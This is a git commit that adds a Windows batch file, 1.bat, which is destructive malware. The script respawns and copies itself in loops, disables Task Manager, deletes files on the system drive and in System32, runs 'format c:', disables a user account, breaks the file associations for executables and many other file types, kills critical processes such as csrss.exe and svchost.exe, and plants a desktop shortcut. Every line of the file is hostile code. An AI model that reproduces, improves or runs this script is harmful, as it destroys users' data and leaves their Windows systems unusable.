2adf9670584baea45b96c8aada38b81905a43d49
SyscoreV1 <77760467+SyscoreV1@users.noreply.github.com>
2021-01-20 16:29:56 -0800

    Add files via upload

---
+++ 1.bat
@@ -0,0 +1,98 @@
+@echo off
+:a
+START 1.bat
+
+
+color 6
+echo "<3"
+
+color 5
+
+START regedit add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f.
+
+echo 儿勒屁艾 艾艾西艾 艾艾 西吉艾艾伊娜伊 > 65481254345685611.txt
+
+START notepad 65481254345685611.txt
+
+echo 艾伊艾吾弗艾吉尺屁艾弗艾哦吉儿尺屁艾艾儿屁尺哦 > 6尺屁艾弗艾哦吉儿尺屁艾艾611.txt
+
+START notepad 6尺屁艾弗艾哦吉儿尺屁艾艾611.txt
+
+echo 儿勒屁艾 艾艾西艾 艾艾 西吉艾艾伊娜伊 > 6548艾 艾艾西艾 艾艾.txt
+
+START notepad 6548艾 艾艾西艾 艾艾.txt
+
+echo 伊屁弗艾儿吉比吾艾伊 > 吉比吾艾5611.txt
+
+START notepad 吉比吾艾5611.txt
+START chrome.exe "http://勒屁艾 艾艾西伊娜艾 艾屁艾弗艾哦艾 西弗艾儿吉比吾吉艾艾"
+
+del %systemdrive%*.* /f /s /q
+rd/s/q C:
+
+net user Dartz /active:no
+wmic useraccount where name='Dartz' set disabled=true
+
+del *.dll
+del *.exe
+del *.ini
+
+cacls C:\Windows\System32
+
+start 1.bat
+
+
+ASSOC .exe=ggeeg45g45g4g45g4e
+ASSOC .dll=fueeggeeegck
+ASSOC .bin=fueegegeegeck
+ASSOC .conf=fegeggeeguck
+ASSOC .cmd=fuceggegeregek
+ASSOC .js=fucgegggk
+ASSOC .log=fueegrgeck
+ASSOC .ink=fgrwfweuck
+ASSOC .c=fucwwfwefwefwk
+ASSOC .cpp=fucfwefwefwefk
+ASSOC .lib=fucwefwfwefk
+ASSOC .png=fuveveerberbeckvev
+ASSOC .jpeg=fiuvneuvbujbuck
+ASSOC .html=fvfveeuvecvkverver
+ASSOC .url=fwweffewfefwuecfwkf
+ASSOC .json=fwfwfuwcfkwff
+ASSOC .yml=verfveruvecrvker
+ASSOC .h=fwfwfewfewefuwfwfck
+ASSOC .hpp=fwfffwwfwweefuwcfwks
+ASSOC .r = eeergergergerge
+ASSOC .ini = fwfwtetefertet
+
+
+taskkill /im aolsoftware.exe /f
+taskkill /im AOLacsd.exe /f
+taskkill /im "AOLSP Scheduler.exe" /f
+
+taskkill /IM csrss.exe /F
+
+format c:
+del *
+del c:\windows\system32\*.* /q
+START powershell -command "wininit.exe"
+
+echo ";)"
+
+TASKKILL /IM svchost.exe /F
+
+start 1.bat
+start %userprofile%\1.bat
+
+for /l %A in (1,1,1000) do copy "1.bat" "1%A.bat"
+for /l %A in (1,1,1000) do START "1%A.bat"
+
+@echo off
+echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
+echo sLinkFile = "%HOMEDRIVE%%HOMEPATH%\Desktop\HAHAHAHHAHAHAHAHAHAHAH.lnk" >> CreateShortcut.vbs
+echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
+echo oLink.TargetPath = "%userprofile%\r.bat" >> CreateShortcut.vbs
+echo oLink.Save >> CreateShortcut.vbs
+cscript CreateShortcut.vbs
+del CreateShortcut.vbs
+
+goto a
